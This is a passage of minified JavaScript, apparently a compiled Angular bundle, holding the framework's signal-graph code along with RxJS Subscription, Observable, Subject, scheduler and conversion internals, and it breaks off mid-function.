var jv = Object.defineProperty,
  Vv = Object.defineProperties,
  Bv = Object.getOwnPropertyDescriptors,
  Yr = Object.getOwnPropertySymbols,
  yd = Object.prototype.hasOwnProperty,
  Cd = Object.prototype.propertyIsEnumerable,
  _d = (t, e, i) =>
    e in t
      ? jv(t, e, { enumerable: !0, configurable: !0, writable: !0, value: i })
      : (t[e] = i),
  C = (t, e) => {
    for (var i in (e ||= {})) yd.call(e, i) && _d(t, i, e[i]);
    if (Yr) for (var i of Yr(e)) Cd.call(e, i) && _d(t, i, e[i]);
    return t;
  },
  Z = (t, e) => Vv(t, Bv(e)),
  wd = (t, e) => {
    var i = {};
    for (var n in t) yd.call(t, n) && e.indexOf(n) < 0 && (i[n] = t[n]);
    if (null != t && Yr)
      for (var n of Yr(t)) e.indexOf(n) < 0 && Cd.call(t, n) && (i[n] = t[n]);
    return i;
  },
  Zr = (t, e, i) =>
    new Promise((n, r) => {
      var o = (c) => {
          try {
            a(i.next(c));
          } catch (l) {
            r(l);
          }
        },
        s = (c) => {
          try {
            a(i.throw(c));
          } catch (l) {
            r(l);
          }
        },
        a = (c) => (c.done ? n(c.value) : Promise.resolve(c.value).then(o, s));
      a((i = i.apply(t, e)).next());
    }),
  bd = null,
  ba = 1,
  Md = Symbol("SIGNAL");
function z(t) {
  let e = bd;
  return (bd = t), e;
}
var Dd = {
  version: 0,
  lastCleanEpoch: 0,
  dirty: !1,
  producerNode: void 0,
  producerLastReadVersion: void 0,
  producerIndexOfThis: void 0,
  nextProducerIndex: 0,
  liveConsumerNode: void 0,
  liveConsumerIndexOfThis: void 0,
  consumerAllowSignalWrites: !1,
  consumerIsAlwaysLive: !1,
  producerMustRecompute: () => !1,
  producerRecomputeValue: () => {},
  consumerMarkedDirty: () => {},
  consumerOnSignalRead: () => {},
};
function Uv(t) {
  if ((!xa(t) || t.dirty) && (t.dirty || t.lastCleanEpoch !== ba)) {
    if (!t.producerMustRecompute(t) && !Ma(t))
      return (t.dirty = !1), void (t.lastCleanEpoch = ba);
    t.producerRecomputeValue(t), (t.dirty = !1), (t.lastCleanEpoch = ba);
  }
}
function xd(t) {
  return t && (t.nextProducerIndex = 0), z(t);
}
function Ed(t, e) {
  if (
    (z(e),
    t &&
      void 0 !== t.producerNode &&
      void 0 !== t.producerIndexOfThis &&
      void 0 !== t.producerLastReadVersion)
  ) {
    if (xa(t))
      for (let i = t.nextProducerIndex; i < t.producerNode.length; i++)
        Da(t.producerNode[i], t.producerIndexOfThis[i]);
    for (; t.producerNode.length > t.nextProducerIndex; )
      t.producerNode.pop(),
        t.producerLastReadVersion.pop(),
        t.producerIndexOfThis.pop();
  }
}
function Ma(t) {
  Qr(t);
  for (let e = 0; e < t.producerNode.length; e++) {
    let i = t.producerNode[e],
      n = t.producerLastReadVersion[e];
    if (n !== i.version || (Uv(i), n !== i.version)) return !0;
  }
  return !1;
}
function Od(t) {
  if ((Qr(t), xa(t)))
    for (let e = 0; e < t.producerNode.length; e++)
      Da(t.producerNode[e], t.producerIndexOfThis[e]);
  (t.producerNode.length =
    t.producerLastReadVersion.length =
    t.producerIndexOfThis.length =
      0),
    t.liveConsumerNode &&
      (t.liveConsumerNode.length = t.liveConsumerIndexOfThis.length = 0);
}
function Da(t, e) {
  if (($v(t), Qr(t), 1 === t.liveConsumerNode.length))
    for (let n = 0; n < t.producerNode.length; n++)
      Da(t.producerNode[n], t.producerIndexOfThis[n]);
  let i = t.liveConsumerNode.length - 1;
  if (
    ((t.liveConsumerNode[e] = t.liveConsumerNode[i]),
    (t.liveConsumerIndexOfThis[e] = t.liveConsumerIndexOfThis[i]),
    t.liveConsumerNode.length--,
    t.liveConsumerIndexOfThis.length--,
    e < t.liveConsumerNode.length)
  ) {
    let n = t.liveConsumerIndexOfThis[e],
      r = t.liveConsumerNode[e];
    Qr(r), (r.producerIndexOfThis[n] = e);
  }
}
function xa(t) {
  return t.consumerIsAlwaysLive || (t?.liveConsumerNode?.length ?? 0) > 0;
}
function Qr(t) {
  (t.producerNode ??= []),
    (t.producerIndexOfThis ??= []),
    (t.producerLastReadVersion ??= []);
}
function $v(t) {
  (t.liveConsumerNode ??= []), (t.liveConsumerIndexOfThis ??= []);
}
function Hv() {
  throw new Error();
}
var zv = Hv;
function Id(t) {
  zv = t;
}
function E(t) {
  return "function" == typeof t;
}
function Pn(t) {
  let i = t((n) => {
    Error.call(n), (n.stack = new Error().stack);
  });
  return (
    (i.prototype = Object.create(Error.prototype)),
    (i.prototype.constructor = i),
    i
  );
}
var Kr = Pn(
  (t) =>
    function (i) {
      t(this),
        (this.message = i
          ? `${i.length} errors occurred during unsubscription:\n${i
              .map((n, r) => `${r + 1}) ${n.toString()}`)
              .join("\n  ")}`
          : ""),
        (this.name = "UnsubscriptionError"),
        (this.errors = i);
    }
);
function tn(t, e) {
  if (t) {
    let i = t.indexOf(e);
    0 <= i && t.splice(i, 1);
  }
}
var Y = class t {
  constructor(e) {
    (this.initialTeardown = e),
      (this.closed = !1),
      (this._parentage = null),
      (this._finalizers = null);
  }
  unsubscribe() {
    let e;
    if (!this.closed) {
      this.closed = !0;
      let { _parentage: i } = this;
      if (i)
        if (((this._parentage = null), Array.isArray(i)))
          for (let o of i) o.remove(this);
        else i.remove(this);
      let { initialTeardown: n } = this;
      if (E(n))
        try {
          n();
        } catch (o) {
          e = o instanceof Kr ? o.errors : [o];
        }
      let { _finalizers: r } = this;
      if (r) {
        this._finalizers = null;
        for (let o of r)
          try {
            Pd(o);
          } catch (s) {
            (e = e ?? []),
              s instanceof Kr ? (e = [...e, ...s.errors]) : e.push(s);
          }
      }
      if (e) throw new Kr(e);
    }
  }
  add(e) {
    var i;
    if (e && e !== this)
      if (this.closed) Pd(e);
      else {
        if (e instanceof t) {
          if (e.closed || e._hasParent(this)) return;
          e._addParent(this);
        }
        (this._finalizers =
          null !== (i = this._finalizers) && void 0 !== i ? i : []).push(e);
      }
  }
  _hasParent(e) {
    let { _parentage: i } = this;
    return i === e || (Array.isArray(i) && i.includes(e));
  }
  _addParent(e) {
    let { _parentage: i } = this;
    this._parentage = Array.isArray(i) ? (i.push(e), i) : i ? [i, e] : e;
  }
  _removeParent(e) {
    let { _parentage: i } = this;
    i === e ? (this._parentage = null) : Array.isArray(i) && tn(i, e);
  }
  remove(e) {
    let { _finalizers: i } = this;
    i && tn(i, e), e instanceof t && e._removeParent(this);
  }
};
Y.EMPTY = (() => {
  let t = new Y();
  return (t.closed = !0), t;
})();
var Ea = Y.EMPTY;
function Xr(t) {
  return (
    t instanceof Y ||
    (t && "closed" in t && E(t.remove) && E(t.add) && E(t.unsubscribe))
  );
}
function Pd(t) {
  E(t) ? t() : t.unsubscribe();
}
var We = {
    onUnhandledError: null,
    onStoppedNotification: null,
    Promise: void 0,
    useDeprecatedSynchronousErrorHandling: !1,
    useDeprecatedNextContext: !1,
  },
  Sn = {
    setTimeout(t, e, ...i) {
      let { delegate: n } = Sn;
      return n?.setTimeout ? n.setTimeout(t, e, ...i) : setTimeout(t, e, ...i);
    },
    clearTimeout(t) {
      let { delegate: e } = Sn;
      return (e?.clearTimeout || clearTimeout)(t);
    },
    delegate: void 0,
  };
function Jr(t) {
  Sn.setTimeout(() => {
    let { onUnhandledError: e } = We;
    if (!e) throw t;
    e(t);
  });
}
function Di() {}
var Sd = Oa("C", void 0, void 0);
function Td(t) {
  return Oa("E", void 0, t);
}
function Ad(t) {
  return Oa("N", t, void 0);
}
function Oa(t, e, i) {
  return { kind: t, value: e, error: i };
}
var nn = null;
function Tn(t) {
  if (We.useDeprecatedSynchronousErrorHandling) {
    let e = !nn;
    if ((e && (nn = { errorThrown: !1, error: null }), t(), e)) {
      let { errorThrown: i, error: n } = nn;
      if (((nn = null), i)) throw n;
    }
  } else t();
}
function Rd(t) {
  We.useDeprecatedSynchronousErrorHandling &&
    nn &&
    ((nn.errorThrown = !0), (nn.error = t));
}
var rn = class extends Y {
    constructor(e) {
      super(),
        (this.isStopped = !1),
        e
          ? ((this.destination = e), Xr(e) && e.add(this))
          : (this.destination = qv);
    }
    static create(e, i, n) {
      return new An(e, i, n);
    }
    next(e) {
      this.isStopped ? Pa(Ad(e), this) : this._next(e);
    }
    error(e) {
      this.isStopped
        ? Pa(Td(e), this)
        : ((this.isStopped = !0), this._error(e));
    }
    complete() {
      this.isStopped ? Pa(Sd, this) : ((this.isStopped = !0), this._complete());
    }
    unsubscribe() {
      this.closed ||
        ((this.isStopped = !0), super.unsubscribe(), (this.destination = null));
    }
    _next(e) {
      this.destination.next(e);
    }
    _error(e) {
      try {
        this.destination.error(e);
      } finally {
        this.unsubscribe();
      }
    }
    _complete() {
      try {
        this.destination.complete();
      } finally {
        this.unsubscribe();
      }
    }
  },
  Wv = Function.prototype.bind;
function Ia(t, e) {
  return Wv.call(t, e);
}
var Sa = class {
    constructor(e) {
      this.partialObserver = e;
    }
    next(e) {
      let { partialObserver: i } = this;
      if (i.next)
        try {
          i.next(e);
        } catch (n) {
          eo(n);
        }
    }
    error(e) {
      let { partialObserver: i } = this;
      if (i.error)
        try {
          i.error(e);
        } catch (n) {
          eo(n);
        }
      else eo(e);
    }
    complete() {
      let { partialObserver: e } = this;
      if (e.complete)
        try {
          e.complete();
        } catch (i) {
          eo(i);
        }
    }
  },
  An = class extends rn {
    constructor(e, i, n) {
      let r;
      if ((super(), E(e) || !e))
        r = { next: e ?? void 0, error: i ?? void 0, complete: n ?? void 0 };
      else {
        let o;
        this && We.useDeprecatedNextContext
          ? ((o = Object.create(e)),
            (o.unsubscribe = () => this.unsubscribe()),
            (r = {
              next: e.next && Ia(e.next, o),
              error: e.error && Ia(e.error, o),
              complete: e.complete && Ia(e.complete, o),
            }))
          : (r = e);
      }
      this.destination = new Sa(r);
    }
  };
function eo(t) {
  We.useDeprecatedSynchronousErrorHandling ? Rd(t) : Jr(t);
}
function Gv(t) {
  throw t;
}
function Pa(t, e) {
  let { onStoppedNotification: i } = We;
  i && Sn.setTimeout(() => i(t, e));
}
var qv = { closed: !0, next: Di, error: Gv, complete: Di },
  Rn = ("function" == typeof Symbol && Symbol.observable) || "@@observable";
function _e(t) {
  return t;
}
function Ta(...t) {
  return Aa(t);
}
function Aa(t) {
  return 0 === t.length
    ? _e
    : 1 === t.length
    ? t[0]
    : function (i) {
        return t.reduce((n, r) => r(n), i);
      };
}
var L = (() => {
  class t {
    constructor(i) {
      i && (this._subscribe = i);
    }
    lift(i) {
      let n = new t();
      return (n.source = this), (n.operator = i), n;
    }
    subscribe(i, n, r) {
      let o = Zv(i) ? i : new An(i, n, r);
      return (
        Tn(() => {
          let { operator: s, source: a } = this;
          o.add(
            s ? s.call(o, a) : a ? this._subscribe(o) : this._trySubscribe(o)
          );
        }),
        o
      );
    }
    _trySubscribe(i) {
      try {
        return this._subscribe(i);
      } catch (n) {
        i.error(n);
      }
    }
    forEach(i, n) {
      return new (n = Nd(n))((r, o) => {
        let s = new An({
          next: (a) => {
            try {
              i(a);
            } catch (c) {
              o(c), s.unsubscribe();
            }
          },
          error: o,
          complete: r,
        });
        this.subscribe(s);
      });
    }
    _subscribe(i) {
      var n;
      return null === (n = this.source) || void 0 === n
        ? void 0
        : n.subscribe(i);
    }
    [Rn]() {
      return this;
    }
    pipe(...i) {
      return Aa(i)(this);
    }
    toPromise(i) {
      return new (i = Nd(i))((n, r) => {
        let o;
        this.subscribe(
          (s) => (o = s),
          (s) => r(s),
          () => n(o)
        );
      });
    }
  }
  return (t.create = (e) => new t(e)), t;
})();
function Nd(t) {
  var e;
  return null !== (e = t ?? We.Promise) && void 0 !== e ? e : Promise;
}
function Yv(t) {
  return t && E(t.next) && E(t.error) && E(t.complete);
}
function Zv(t) {
  return (t && t instanceof rn) || (Yv(t) && Xr(t));
}
function Ra(t) {
  return E(t?.lift);
}
function R(t) {
  return (e) => {
    if (Ra(e))
      return e.lift(function (i) {
        try {
          return t(i, this);
        } catch (n) {
          this.error(n);
        }
      });
    throw new TypeError("Unable to lift unknown Observable type");
  };
}
function S(t, e, i, n, r) {
  return new Na(t, e, i, n, r);
}
var Na = class extends rn {
  constructor(e, i, n, r, o, s) {
    super(e),
      (this.onFinalize = o),
      (this.shouldUnsubscribe = s),
      (this._next = i
        ? function (a) {
            try {
              i(a);
            } catch (c) {
              e.error(c);
            }
          }
        : super._next),
      (this._error = r
        ? function (a) {
            try {
              r(a);
            } catch (c) {
              e.error(c);
            } finally {
              this.unsubscribe();
            }
          }
        : super._error),
      (this._complete = n
        ? function () {
            try {
              n();
            } catch (a) {
              e.error(a);
            } finally {
              this.unsubscribe();
            }
          }
        : super._complete);
  }
  unsubscribe() {
    var e;
    if (!this.shouldUnsubscribe || this.shouldUnsubscribe()) {
      let { closed: i } = this;
      super.unsubscribe(),
        !i && (null === (e = this.onFinalize) || void 0 === e || e.call(this));
    }
  }
};
function Nn() {
  return R((t, e) => {
    let i = null;
    t._refCount++;
    let n = S(e, void 0, void 0, void 0, () => {
      if (!t || t._refCount <= 0 || 0 < --t._refCount) return void (i = null);
      let r = t._connection,
        o = i;
      (i = null), r && (!o || r === o) && r.unsubscribe(), e.unsubscribe();
    });
    t.subscribe(n), n.closed || (i = t.connect());
  });
}
var kn = class extends L {
    constructor(e, i) {
      super(),
        (this.source = e),
        (this.subjectFactory = i),
        (this._subject = null),
        (this._refCount = 0),
        (this._connection = null),
        Ra(e) && (this.lift = e.lift);
    }
    _subscribe(e) {
      return this.getSubject().subscribe(e);
    }
    getSubject() {
      let e = this._subject;
      return (
        (!e || e.isStopped) && (this._subject = this.subjectFactory()),
        this._subject
      );
    }
    _teardown() {
      this._refCount = 0;
      let { _connection: e } = this;
      (this._subject = this._connection = null), e?.unsubscribe();
    }
    connect() {
      let e = this._connection;
      if (!e) {
        e = this._connection = new Y();
        let i = this.getSubject();
        e.add(
          this.source.subscribe(
            S(
              i,
              void 0,
              () => {
                this._teardown(), i.complete();
              },
              (n) => {
                this._teardown(), i.error(n);
              },
              () => this._teardown()
            )
          )
        ),
          e.closed && ((this._connection = null), (e = Y.EMPTY));
      }
      return e;
    }
    refCount() {
      return Nn()(this);
    }
  },
  kd = Pn(
    (t) =>
      function () {
        t(this),
          (this.name = "ObjectUnsubscribedError"),
          (this.message = "object unsubscribed");
      }
  ),
  N = (() => {
    class t extends L {
      constructor() {
        super(),
          (this.closed = !1),
          (this.currentObservers = null),
          (this.observers = []),
          (this.isStopped = !1),
          (this.hasError = !1),
          (this.thrownError = null);
      }
      lift(i) {
        let n = new to(this, this);
        return (n.operator = i), n;
      }
      _throwIfClosed() {
        if (this.closed) throw new kd();
      }
      next(i) {
        Tn(() => {
          if ((this._throwIfClosed(), !this.isStopped)) {
            this.currentObservers ||
              (this.currentObservers = Array.from(this.observers));
            for (let n of this.currentObservers) n.next(i);
          }
        });
      }
      error(i) {
        Tn(() => {
          if ((this._throwIfClosed(), !this.isStopped)) {
            (this.hasError = this.isStopped = !0), (this.thrownError = i);
            let { observers: n } = this;
            for (; n.length; ) n.shift().error(i);
          }
        });
      }
      complete() {
        Tn(() => {
          if ((this._throwIfClosed(), !this.isStopped)) {
            this.isStopped = !0;
            let { observers: i } = this;
            for (; i.length; ) i.shift().complete();
          }
        });
      }
      unsubscribe() {
        (this.isStopped = this.closed = !0),
          (this.observers = this.currentObservers = null);
      }
      get observed() {
        var i;
        return (
          (null === (i = this.observers) || void 0 === i ? void 0 : i.length) >
          0
        );
      }
      _trySubscribe(i) {
        return this._throwIfClosed(), super._trySubscribe(i);
      }
      _subscribe(i) {
        return (
          this._throwIfClosed(),
          this._checkFinalizedStatuses(i),
          this._innerSubscribe(i)
        );
      }
      _innerSubscribe(i) {
        let { hasError: n, isStopped: r, observers: o } = this;
        return n || r
          ? Ea
          : ((this.currentObservers = null),
            o.push(i),
            new Y(() => {
              (this.currentObservers = null), tn(o, i);
            }));
      }
      _checkFinalizedStatuses(i) {
        let { hasError: n, thrownError: r, isStopped: o } = this;
        n ? i.error(r) : o && i.complete();
      }
      asObservable() {
        let i = new L();
        return (i.source = this), i;
      }
    }
    return (t.create = (e, i) => new to(e, i)), t;
  })(),
  to = class extends N {
    constructor(e, i) {
      super(), (this.destination = e), (this.source = i);
    }
    next(e) {
      var i, n;
      null ===
        (n =
          null === (i = this.destination) || void 0 === i ? void 0 : i.next) ||
        void 0 === n ||
        n.call(i, e);
    }
    error(e) {
      var i, n;
      null ===
        (n =
          null === (i = this.destination) || void 0 === i ? void 0 : i.error) ||
        void 0 === n ||
        n.call(i, e);
    }
    complete() {
      var e, i;
      null ===
        (i =
          null === (e = this.destination) || void 0 === e
            ? void 0
            : e.complete) ||
        void 0 === i ||
        i.call(e);
    }
    _subscribe(e) {
      var i, n;
      return null !==
        (n =
          null === (i = this.source) || void 0 === i
            ? void 0
            : i.subscribe(e)) && void 0 !== n
        ? n
        : Ea;
    }
  },
  le = class extends N {
    constructor(e) {
      super(), (this._value = e);
    }
    get value() {
      return this.getValue();
    }
    _subscribe(e) {
      let i = super._subscribe(e);
      return !i.closed && e.next(this._value), i;
    }
    getValue() {
      let { hasError: e, thrownError: i, _value: n } = this;
      if (e) throw i;
      return this._throwIfClosed(), n;
    }
    next(e) {
      super.next((this._value = e));
    }
  },
  ka = { now: () => (ka.delegate || Date).now(), delegate: void 0 },
  no = class extends Y {
    constructor(e, i) {
      super();
    }
    schedule(e, i = 0) {
      return this;
    }
  },
  xi = {
    setInterval(t, e, ...i) {
      let { delegate: n } = xi;
      return n?.setInterval
        ? n.setInterval(t, e, ...i)
        : setInterval(t, e, ...i);
    },
    clearInterval(t) {
      let { delegate: e } = xi;
      return (e?.clearInterval || clearInterval)(t);
    },
    delegate: void 0,
  },
  io = class extends no {
    constructor(e, i) {
      super(e, i), (this.scheduler = e), (this.work = i), (this.pending = !1);
    }
    schedule(e, i = 0) {
      var n;
      if (this.closed) return this;
      this.state = e;
      let r = this.id,
        o = this.scheduler;
      return (
        null != r && (this.id = this.recycleAsyncId(o, r, i)),
        (this.pending = !0),
        (this.delay = i),
        (this.id =
          null !== (n = this.id) && void 0 !== n
            ? n
            : this.requestAsyncId(o, this.id, i)),
        this
      );
    }
    requestAsyncId(e, i, n = 0) {
      return xi.setInterval(e.flush.bind(e, this), n);
    }
    recycleAsyncId(e, i, n = 0) {
      if (null != n && this.delay === n && !1 === this.pending) return i;
      null != i && xi.clearInterval(i);
    }
    execute(e, i) {
      if (this.closed) return new Error("executing a cancelled action");
      this.pending = !1;
      let n = this._execute(e, i);
      if (n) return n;
      !1 === this.pending &&
        null != this.id &&
        (this.id = this.recycleAsyncId(this.scheduler, this.id, null));
    }
    _execute(e, i) {
      let r,
        n = !1;
      try {
        this.work(e);
      } catch (o) {
        (n = !0), (r = o || new Error("Scheduled action threw falsy error"));
      }
      if (n) return this.unsubscribe(), r;
    }
    unsubscribe() {
      if (!this.closed) {
        let { id: e, scheduler: i } = this,
          { actions: n } = i;
        (this.work = this.state = this.scheduler = null),
          (this.pending = !1),
          tn(n, this),
          null != e && (this.id = this.recycleAsyncId(i, e, null)),
          (this.delay = null),
          super.unsubscribe();
      }
    }
  },
  Fn = class t {
    constructor(e, i = t.now) {
      (this.schedulerActionCtor = e), (this.now = i);
    }
    schedule(e, i = 0, n) {
      return new this.schedulerActionCtor(this, e).schedule(n, i);
    }
  };
Fn.now = ka.now;
var ro = class extends Fn {
    constructor(e, i = Fn.now) {
      super(e, i), (this.actions = []), (this._active = !1);
    }
    flush(e) {
      let n,
        { actions: i } = this;
      if (this._active) i.push(e);
      else {
        this._active = !0;
        do {
          if ((n = e.execute(e.state, e.delay))) break;
        } while ((e = i.shift()));
        if (((this._active = !1), n)) {
          for (; (e = i.shift()); ) e.unsubscribe();
          throw n;
        }
      }
    }
  },
  Ei = new ro(io),
  Fd = Ei,
  ye = new L((t) => t.complete());
function oo(t) {
  return t && E(t.schedule);
}
function Fa(t) {
  return t[t.length - 1];
}
function Ld(t) {
  return E(Fa(t)) ? t.pop() : void 0;
}
function rt(t) {
  return oo(Fa(t)) ? t.pop() : void 0;
}
function jd(t, e) {
  return "number" == typeof Fa(t) ? t.pop() : e;
}
function Bd(t, e, i, n) {
  return new (i || (i = Promise))(function (o, s) {
    function a(u) {
      try {
        l(n.next(u));
      } catch (d) {
        s(d);
      }
    }
    function c(u) {
      try {
        l(n.throw(u));
      } catch (d) {
        s(d);
      }
    }
    function l(u) {
      u.done
        ? o(u.value)
        : (function r(o) {
            return o instanceof i
              ? o
              : new i(function (s) {
                  s(o);
                });
          })(u.value).then(a, c);
    }
    l((n = n.apply(t, e || [])).next());
  });
}
function Vd(t) {
  var e = "function" == typeof Symbol && Symbol.iterator,
    i = e && t[e],
    n = 0;
  if (i) return i.call(t);
  if (t && "number" == typeof t.length)
    return {
      next: function () {
        return (
          t && n >= t.length && (t = void 0), { value: t && t[n++], done: !t }
        );
      },
    };
  throw new TypeError(
    e ? "Object is not iterable." : "Symbol.iterator is not defined."
  );
}
function on(t) {
  return this instanceof on ? ((this.v = t), this) : new on(t);
}
function Ud(t, e, i) {
  if (!Symbol.asyncIterator)
    throw new TypeError("Symbol.asyncIterator is not defined.");
  var r,
    n = i.apply(t, e || []),
    o = [];
  return (
    (r = {}),
    a("next"),
    a("throw"),
    a("return", function s(m) {
      return function (w) {
        return Promise.resolve(w).then(m, d);
      };
    }),
    (r[Symbol.asyncIterator] = function () {
      return this;
    }),
    r
  );
  function a(m, w) {
    n[m] &&
      ((r[m] = function (M) {
        return new Promise(function (G, H) {
          o.push([m, M, G, H]) > 1 || c(m, M);
        });
      }),
      w && (r[m] = w(r[m])));
  }
  function c(m, w) {
    try {
      !(function l(m) {
        m.value instanceof on
          ? Promise.resolve(m.value.v).then(u, d)
          : f(o[0][2], m);
      })(n[m](w));
    } catch (M) {
      f(o[0][3], M);
    }
  }
  function u(m) {
    c("next", m);
  }
  function d(m) {
    c("throw", m);
  }
  function f(m, w) {
    m(w), o.shift(), o.length && c(o[0][0], o[0][1]);
  }
}
function $d(t) {
  if (!Symbol.asyncIterator)
    throw new TypeError("Symbol.asyncIterator is not defined.");
  var i,
    e = t[Symbol.asyncIterator];
  return e
    ? e.call(t)
    : ((t = "function" == typeof Vd ? Vd(t) : t[Symbol.iterator]()),
      (i = {}),
      n("next"),
      n("throw"),
      n("return"),
      (i[Symbol.asyncIterator] = function () {
        return this;
      }),
      i);
  function n(o) {
    i[o] =
      t[o] &&
      function (s) {
        return new Promise(function (a, c) {
          (function r(o, s, a, c) {
            Promise.resolve(c).then(function (l) {
              o({ value: l, done: a });
            }, s);
          })(a, c, (s = t[o](s)).done, s.value);
        });
      };
  }
}
var Ln = (t) => t && "number" == typeof t.length && "function" != typeof t;
function so(t) {
  return E(t?.then);
}
function ao(t) {
  return E(t[Rn]);
}
function co(t) {
  return Symbol.asyncIterator && E(t?.[Symbol.asyncIterator]);
}
function lo(t) {
  return new TypeError(
    `You provided ${
      null !== t && "object" == typeof t ? "an invalid object" : `'${t}'`
    } where a stream was expected. You can provide an Observable, Promise, ReadableStream, Array, AsyncIterable, or Iterable.`
  );
}
function Qv() {
  return "function" == typeof Symbol && Symbol.iterator
    ? Symbol.iterator
    : "@@iterator";
}
var uo = Qv();
function fo(t) {
  return E(t?.[uo]);
}
function ho(t) {
  return Ud(this, arguments, function* () {
    let i = t.getReader();
    try {
      for (;;) {
        let { value: n, done: r } = yield on(i.read());
        if (r) return yield on(void 0);
        yield yield on(n);
      }
    } finally {
      i.releaseLock();
    }
  });
}
function po(t) {
  return E(t?.getReader);
}
function J(t) {
  if (t instanceof L) return t;
  if (null != t) {
    if (ao(t)) return Kv(t);
    if (Ln(t)) return Xv(t);
    if (so(t)) return Jv(t);
    if (co(t)) return Hd(t);
    if (fo(t)) return e_(t);
    if (po(t)) return t_(t);
  }
  throw lo(t);
}
function Kv(t) {
  return new L((e) => {
    let i = t[Rn]();
    if (E(i.subscribe)) return i.subscribe(e);
    throw new TypeError(
      "Provided object does not correctly implement Symbol.observable"
    );
  });
}
function Xv(t) {
  return new L((e) => {
    for (let i = 0; i < t.length && !e.closed; i++) e.next(t[i]);
    e.complete();
  });
}
function Jv(t) {
  return new L((e) => {
    t.then(
      (i) => {
        e.closed || (e.next(i), e.complete());
      },
      (i) => e.error(i)
    ).then(null, Jr);
  });
}
function e_(t) {
  return new L((e) => {
    for (let i of t) if ((e.next(i), e.closed)) return;
    e.complete();
  });
}
function Hd(t) {
  return new L((e) => {
    n_(t, e).catch((i) => e.error(i));
  });
}
function t_(t) {
  return Hd(ho(t));
}
function n_(t, e) {
  var i, n, r, o;
  return Bd(this, void 0, void 0, function* () {
    try {
      for (i = $d(t); !(n = yield i.next()).done; ) {
        let s = n.value;
        if ((e.next(s), e.closed)) return;
      }
    } catch (s) {
      r = { error: s };
    } finally {
      try {
        n && !n.done && (o = i.return) && (yield o.call(i));
      } finally {
        if (r) throw r.error;
      }
    }
    e.complete();
  });
}
function De(t, e, i, n = 0, r = !1) {
  let o = e.schedule(function () {
    i(), r ? t.add(this.schedule(null, n)) : this.unsubscribe();
  }, n);
  if ((t.add(o), !r)) return o;
}
function go(t, e = 0) {
  return R((i, n) => {
    i.subscribe(
      S(
        n,
        (r) => De(n, t, () => n.next(r), e),
        () => De(n, t, () => n.complete(), e),
        (r) => De(n, t, () => n.error(r), e)
      )
    );
  });
}
function mo(t, e = 0) {
  return R((i, n) => {
    n.add(t.schedule(() => i.subscribe(n), e));
  });
}
function zd(t, e) {
  return J(t).pipe(mo(e), go(e));
}
function Wd(t, e) {
  return J(t).pipe(mo(e), go(e));
}
function Gd(t, e) {
  return new L((i) => {
    let n = 0;
    return e.schedule(function () {
      n === t.length
        ? i.complete()
        : (i.next(t[n++]), i.closed || this.schedule());
    });
  });
}
function qd(t, e) {
  return new L((i) => {
    let n;
    return (
      De(i, e, () => {
        (n = t[uo]()),
          De(
            i,
            e,
            () => {
              let r, o;
              try {
                ({ value: r, done: o } = n.next());
              } catch (s) {
                return void i.error(s);
              }
              o ? i.complete() : i.next(r);
            },
            0,
            !0
          );
      }),
      () => E(n?.return) && n.return()
    );
  });
}
function vo(t, e) {
  if (!t) throw new Error("Iterable cannot be null");
  return new L((i) => {
    De(i, e, () => {
      let n = t[Symbol.asyncIterator]();
      De(
        i,
        e,
        () => {
          n.next().then((r) => {
            r.done ? i.complete() : i.next(r.value);
          });
        },
        0,
        !0
      );
    });
  });
}
function Yd(t, e) {
  return vo(ho(t), e);
}
function Zd(t, e) {
  if (null != t) {
    if (ao(t)) return zd(t, e);
    if (Ln(t)) return Gd(t, e);
    if (so(t)) return Wd(t, e);
    if (co(t)) return vo(t, e);
    if (fo(t)) return qd(t, e);
    if (po(t)) return Yd(t, e);
  }
  throw lo(t);
}
function ee(t, e) {
  return e ? Zd(t, e) : J(t);
}
function x(...t) {
  return ee(t, rt(t));
}
function jn(t, e) {
  let i = E(t) ? t : () => t,
    n = (r) => r.error(i());
  return new L(e ? (r) => e.schedule(n, 0, r) : n);
}
function _o(t) {
  return !!t && (t instanceof L || (E(t.lift) && E(t.subscribe)));
}
var yt = Pn(
  (t) =>
    function () {
      t(this),
        (this.name = "EmptyError"),
        (this.message = "no elements in sequence");
    }
);
function Qd(t) {
  return t instanceof Date && !isNaN(t);
}
function F(t, e) {
  return R((i, n) => {
    let r = 0;
    i.subscribe(
      S(n, (o) => {
        n.next(t.call(e, o, r++));
      })
    );
  });
}
var { isArray: i_ } = Array;
function r_(t, e) {
  return i_(e) ? t(...e) : t(e);
}
function yo(t) {
  return F((e) => r_(t, e));
}
var { isArray: o_ } = Array,
  { getPrototypeOf: s_, prototype: a_, keys: c_ } = Object;
function Kd(t) {
  if (1 === t.length) {
    let e = t[0];
    if (o_(e)) return { args: e, keys: null };
    if (l_(e)) {
      let i = c_(e);
      return { args: i.map((n) => e[n]), keys: i };
    }
  }
  return { args: t, keys: null };
}
function l_(t) {
  return t && "object" == typeof t && s_(t) === a_;
}
function Xd(t, e) {
  return t.reduce((i, n, r) => ((i[n] = e[r]), i), {});
}
function sn(...t) {
  let e = rt(t),
    i = Ld(t),
    { args: n, keys: r } = Kd(t);
  if (0 === n.length) return ee([], e);
  let o = new L(u_(n, e, r ? (s) => Xd(r, s) : _e));
  return i ? o.pipe(yo(i)) : o;
}
function u_(t, e, i = _e) {
  return (n) => {
    Jd(
      e,
      () => {
        let { length: r } = t,
          o = new Array(r),
          s = r,
          a = r;
        for (let c = 0; c < r; c++)
          Jd(
            e,
            () => {
              let l = ee(t[c], e),
                u = !1;
              l.subscribe(
                S(
                  n,
                  (d) => {
                    (o[c] = d), u || ((u = !0), a--), a || n.next(i(o.slice()));
                  },
                  () => {
                    --s || n.complete();
                  }
                )
              );
            },
            n
          );
      },
      n
    );
  };
}
function Jd(t, e, i) {
  t ? De(i, t, e) : e();
}
function ef(t, e, i, n, r, o, s, a) {
  let c = [],
    l = 0,
    u = 0,
    d = !1,
    f = () => {
      d && !c.length && !l && e.complete();
    },
    m = (M) => (l < n ? w(M) : c.push(M)),
    w = (M) => {
      o && e.next(M), l++;
      let G = !1;
      J(i(M, u++)).subscribe(
        S(
          e,
          (H) => {
            r?.(H), o ? m(H) : e.next(H);
          },
          () => {
            G = !0;
          },
          void 0,
          () => {
            if (G)
              try {
                for (l--; c.length && l < n; ) {
                  let H = c.shift();
                  s ? De(e, s, () => w(H)) : w(H);
                }
                f();
              } catch (H) {
                e.error(H);
              }
          }
        )
      );
    };
  return (
    t.subscribe(
      S(e, m, () => {
        (d = !0), f();
      })
    ),
    () => {
      a?.();
    }
  );
}
function ie(t, e, i = 1 / 0) {
  return E(e)
    ? ie((n, r) => F((o, s) => e(n, o, r, s))(J(t(n, r))), i)
